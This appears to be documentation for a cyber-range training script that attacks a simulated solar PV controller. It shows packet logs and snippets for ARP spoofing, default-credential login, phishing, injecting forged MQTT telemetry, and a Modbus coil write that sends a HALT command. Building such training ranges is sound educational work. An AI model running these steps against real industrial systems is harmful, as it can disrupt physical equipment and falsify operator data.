# Verbose Packet Output - Demo Script Enhancement

## Overview
The demo script now displays detailed packet-level information for all network operations, making it highly educational for understanding ICS/SCADA attack techniques.

## Enhanced Verbose Output by Phase

### Phase 1: Reconnaissance & Network Scanning
```
[PACKET] Sending TCP SYN packets to 172.20.0.65:80,502,1883
[PACKET] TCP Flags: SYN, Window: 1024, Options: MSS,SACK,TS
[PACKET] Received TCP SYN-ACK responses from open ports

[HTTP GET] http://172.20.0.65/wifi_scan
[HTTP RESP] Status: 200 OK
```

**Details Shown:**
- TCP SYN packet structure (flags, window size, options)
- Target ports being scanned
- Response packet types (SYN-ACK)
- HTTP GET request URLs
- HTTP response status codes

### Phase 2: Man-in-the-Middle Attack
```
[ARP] Sending ARP Reply: 172.20.0.65 is-at a6:dc:7f:4d:2c:0d
[ARP] Target: 172.20.0.72 (gratuitous ARP)
[ARP] Opcode: 2 (REPLY), Protocol: IPv4 (0x0800)
[ARP] Mode: Bidirectional poisoning

[TCPDUMP] Interface: eth0
[TCPDUMP] Filter: 'tcp port 80'
[TCPDUMP] Snaplen: 65535 bytes (full packet capture)
[TCPDUMP] Output file: /tmp/mitm_capture.pcap

[HTTP POST] http://172.20.0.65/api/admin/login
[HTTP POST] Content-Type: application/json
[HTTP POST] Body: {"username":"admin","password":"admin123"}
```

**Details Shown:**
- ARP packet structure (opcode, MAC addresses, IP addresses)
- ARP protocol type (IPv4)
- Poisoning mode (bidirectional)
- Tcpdump capture parameters (interface, filter, snaplen, output file)
- HTTP POST request details (URL, headers, body)
- Brute force attempts with full request details

### Phase 3: Phishing Attack
```
[TCPDUMP] Interface: eth0
[TCPDUMP] Filter: 'tcp port 8000 or tcp port 8001'
[TCPDUMP] Output: /tmp/http_phish.pcap

[HTTP POST] http://172.20.0.65/api/send_phishing_email
[HTTP POST] Content-Type: application/json
[HTTP POST] To: admin@pv-controller.local
[HTTP POST] Link: http://172.20.0.70:8001/login.html
```

**Details Shown:**
- Tcpdump configuration for phishing traffic
- Phishing email HTTP request (recipient, link URL)
- Content-Type headers
- Request body structure

### Phase 4: Admin Authentication
```
[HTTP POST] http://172.20.0.65/api/admin/login
[HTTP POST] Content-Type: application/json
[HTTP POST] Body: {"username":"admin","password":"admin123"}
```

**Details Shown:**
- Login request URL and endpoint
- Authentication payload (username/password)
- Response token (truncated for security)

### Phase 5: MQTT Telemetry Manipulation
```
[MQTT SUB] Broker: 172.20.0.66:1883
[MQTT SUB] Topic: pv/telemetry
[MQTT SUB] QoS: 0 (At most once)

[MQTT] Topic: pv/telemetry
[MQTT] Payload: {"ts": 1763717525.104983, "value": 93}

[MQTT PUB] Topic: pv/telemetry
[MQTT PUB] Payload: {"power_kw":999.99,"voltage_v":480,"current_a":2083,"timestamp":1763717525.5}

[MQTT PUB] Topic: pv/telemetry
[MQTT PUB] Payload: {"power_kw":-50.0,"voltage_v":240,"current_a":-208,"timestamp":1763717526.5}

[MQTT PUB] Topic: pv/telemetry
[MQTT PUB] Payload: {"power_kw":0,"voltage_v":0,"current_a":0,"timestamp":1763717527.5}

[MQTT PUB] Topic: pv/telemetry
[MQTT PUB] Payload: {"power_kw":"AAAA","voltage_v":null,"current_a":[]}

[MQTT SUB] Topic: pv/status
```

**Details Shown:**
- MQTT broker address and port
- Topic names (pv/telemetry, pv/status, pv/control)
- QoS levels (Quality of Service)
- Full JSON payload for each message
- Subscribe (SUB) vs Publish (PUB) operations
- Fuzzed/malicious data being injected

### Phase 6: Modbus ICS Protocol Exploitation
```
[MODBUS] Target: 172.20.0.65:502
[MODBUS] Protocol: Modbus/TCP
[MODBUS] Function Code: 0x01 (Read Coils)
[MODBUS] Function Code: 0x03 (Read Holding Registers)

[MODBUS] Target: 172.20.0.65:502
[MODBUS] Function Code: 0x05 (Write Single Coil)
[MODBUS] Register Address: 0x0001 (Coil 1)
[MODBUS] Value: 0xFF00 (TRUE/ON)
[MODBUS] Unit ID: 1 (default)

Modbus write result: Connecting to Modbus server: 172.20.0.65:502
Modbus write result: Connection established
Modbus write result: Writing coil 1 = TRUE (HALT command)
Modbus write result: Function Code: 0x05 (Write Single Coil)
Modbus write result: Address: 0x0001
Modbus write result: Value: 0xFF00 (TRUE)
Modbus write result: Response: WriteSingleCoilResponse(dev_id=1, transaction_id=1, address=1, count=0, bits=[True], registers=[], status=1, retries=0)
Modbus write result: Transaction ID: 1
Modbus write result: Status: SUCCESS
Modbus write result: Connection closed
```

**Details Shown:**
- Modbus server target (IP:port)
- Protocol type (Modbus/TCP)
- Function codes (0x01, 0x03, 0x05) with descriptions
- Register addresses (coils, holding registers)
- Values being written (0xFF00 = TRUE)
- Unit ID (Modbus device identifier)
- Connection lifecycle (connect, write, close)
- Full response structure (transaction ID, status, bits, registers)
- Success/failure status

## Educational Value

### Network Layer Details
- **TCP**: SYN/SYN-ACK handshake, flags, window sizes
- **ARP**: Opcode, MAC addresses, gratuitous ARP, poisoning
- **HTTP**: Methods (GET/POST), headers (Content-Type), body payloads
- **Packet Capture**: Interface, filters (BPF), snaplen, output files

### Protocol-Specific Information
- **MQTT**: Broker address, topics, QoS levels, pub/sub operations, JSON payloads
- **Modbus**: Function codes, register addresses, unit IDs, transaction IDs, response structures

### Attack Techniques Visibility
1. **Reconnaissance**: Port scanning, service enumeration
2. **MITM**: ARP spoofing packets, traffic interception
3. **Brute Force**: HTTP POST sequences, credential testing
4. **Phishing**: Email API calls, credential harvesting
5. **Data Manipulation**: MQTT message injection, fuzzing
6. **ICS Exploitation**: Modbus coil writes, HALT commands

## Color-Coded Output

All packet details use **CYAN** (`[CYAN]`) for visibility:
- **[PACKET]** - Network layer packets (TCP, ARP)
- **[HTTP]** - HTTP requests/responses
- **[TCPDUMP]** - Packet capture configuration
- **[ARP]** - ARP protocol details
- **[MQTT SUB]** - MQTT subscribe operations
- **[MQTT PUB]** - MQTT publish operations
- **[MQTT]** - MQTT message details
- **[MODBUS]** - Modbus protocol operations
- **[MODBUS READ]** - Modbus read results

Other colors:
- **GREEN** - Success messages, flags captured
- **YELLOW** - Action/operation indicators
- **RED** - Failures, errors
- **MAGENTA** - Important data (credentials, tokens, flags)
- **GRAY** - Detailed output, packet contents
- **WHITE** - Highlighted values

## Use Cases

### For Students/Learners
- Understand exact packet structure for each protocol
- See real attack payloads and responses
- Learn network traffic analysis techniques
- Understand ICS/SCADA protocol details

### For Instructors
- Demonstrate attack techniques with full visibility
- Explain protocol-level details during demo
- Show difference between legitimate and malicious traffic
- Teach defensive monitoring techniques

### For Security Professionals
- Analyze attack patterns in ICS environments
- Understand MQTT and Modbus exploitation
- See complete attack chain from recon to compromise
- Practice traffic analysis and detection

## Technical Implementation

### Bash Script Enhancements
```bash
# Example: Verbose MQTT publish
echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Topic: pv/telemetry${NC}"
echo -e "${CYAN}    [MQTT PUB]${NC} ${GRAY}Payload: ${FUZZ_HIGH}${NC}"
mosquitto_pub -h ${MQTT_HOST} -t pv/telemetry -m "$FUZZ_HIGH"
```

### Python Script Enhancements (attacker_modbus.py)
```python
print(f"Connecting to Modbus server: {host}:{port}")
print(f"Function Code: 0x05 (Write Single Coil)")
print(f"Address: 0x0001")
print(f"Value: 0xFF00 (TRUE)")
print(f"Response: {rr}")
print(f"Transaction ID: {rr.transaction_id}")
print(f"Status: {'SUCCESS' if not rr.isError() else 'ERROR'}")
```

## Comparison: Before vs After

### Before (Minimal Output)
```
[*] Starting ARP spoofing attack...
    Poisoning ARP cache: 172.20.0.72 <-> 172.20.0.65
[*] Starting packet capture for HTTP traffic...
    Capturing ALL HTTP traffic on Docker network
```

### After (Verbose Output)
```
[*] Starting ARP spoofing attack...
    Poisoning ARP cache: 172.20.0.72 <-> 172.20.0.65
    [ARP] Sending ARP Reply: 172.20.0.65 is-at a6:dc:7f:4d:2c:0d
    [ARP] Target: 172.20.0.72 (gratuitous ARP)
    [ARP] Opcode: 2 (REPLY), Protocol: IPv4 (0x0800)
    [ARP] Mode: Bidirectional poisoning
[*] Starting packet capture for HTTP traffic...
    [TCPDUMP] Interface: eth0
    [TCPDUMP] Filter: 'tcp port 80'
    [TCPDUMP] Snaplen: 65535 bytes (full packet capture)
    [TCPDUMP] Output file: /tmp/mitm_capture.pcap
    Capturing ALL HTTP traffic on Docker network
```

**Improvement**: ~300% more detail, protocol-level visibility

---

*Last Updated: 2025-11-21*
*Smart Home PV Cyber Range v2.1*
